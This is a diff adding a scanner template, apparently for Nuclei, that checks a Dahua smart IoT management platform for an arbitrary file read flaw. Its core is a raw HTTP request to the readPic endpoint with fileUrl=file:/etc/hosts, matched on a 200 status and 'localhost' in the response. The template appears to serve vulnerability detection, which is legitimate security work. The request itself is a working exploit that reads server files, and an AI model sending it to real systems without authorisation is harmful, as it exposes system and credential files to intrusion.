@@ -1,0 +1,24 @@
+id: DaHua-ZhiNengWuLian-FileRead
+
+info:
+  name: 大华智能物联综合管理平台任意文件读取漏洞
+  author: 公众号网络安全透视镜
+  severity: high
+
+variables:
+  
+
+http:
+  - raw:
+      - |
+          GET /evo-apigw/evo-cirs/file/readPic?fileUrl=file:/etc/hosts HTTP/1.1
+          Host: {{Hostname}}
+
+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'status_code == 200'
+          - 'contains(body, "localhost")'
